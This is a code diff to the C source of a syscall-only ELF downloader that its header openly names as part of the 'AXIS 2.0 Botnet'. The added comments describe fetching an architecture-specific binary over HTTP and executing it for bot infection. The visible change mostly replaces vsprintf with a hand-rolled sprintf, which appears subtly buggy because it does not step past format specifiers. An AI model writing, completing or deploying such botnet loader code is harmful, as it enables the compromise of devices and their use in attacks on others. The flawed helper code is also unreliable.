@@ -1,6 +1,12 @@
 /*
  * Minimal ELF Downloader - Direct syscall implementation
  * AXIS 2.0 Botnet
+ * ============================================================================
+ * Ultra-small downloader using direct syscalls (no libc)
+ * Downloads architecture-specific binary from HTTP server
+ * Executes payload for bot infection
+ * Size optimized: ~4KB static binary
+ * ============================================================================
  */
 
 #include <stdint.h>
@@ -72,10 +78,63 @@ static void x_exit(int status) {
 /* Simple sprintf implementation for minimal environments */
 static int xsprintf(char *str, const char *format, ...) {
     va_list args;
+    char *p = str;
+    const char *f = format;
+    int num;
+    int i, len;
+    char numbuf[32];
+    
     va_start(args, format);
-    int len = vsprintf(str, format, args);
+    
+    while (*f) {
+        if (*f == '%') {
+            f++;
+            if (*f == 's') {
+                char *s = va_arg(args, char *);
+                while (*s) *p++ = *s++;
+            } else if (*f == 'd') {
+                num = va_arg(args, int);
+                if (num < 0) {
+                    *p++ = '-';
+                    num = -num;
+                }
+                len = 0;
+                if (num == 0) {
+                    numbuf[len++] = '0';
+                } else {
+                    while (num > 0) {
+                        numbuf[len++] = '0' + (num % 10);
+                        num /= 10;
+                    }
+                }
+                for (i = len - 1; i >= 0; i--) {
+                    *p++ = numbuf[i];
+                }
+            } else if (*f == 'x') {
+                num = va_arg(args, int);
+                len = 0;
+                if (num == 0) {
+                    numbuf[len++] = '0';
+                } else {
+                    while (num > 0) {
+                        int d = num % 16;
+                        numbuf[len++] = (d < 10) ? '0' + d : 'a' + (d - 10);
+                        num /= 16;
+                    }
+                }
+                for (i = len - 1; i >= 0; i--) {
+                    *p++ = numbuf[i];
+                }
+            } else if (*f == '%') {
+                *p++ = '%';
+            }
+        } else {
+            *p++ = *f++;
+        }
+    }
+    *p = '\0';
     va_end(args);
-    return len;
+    return p - str;
 }
 
 /* Simple memmem implementation */
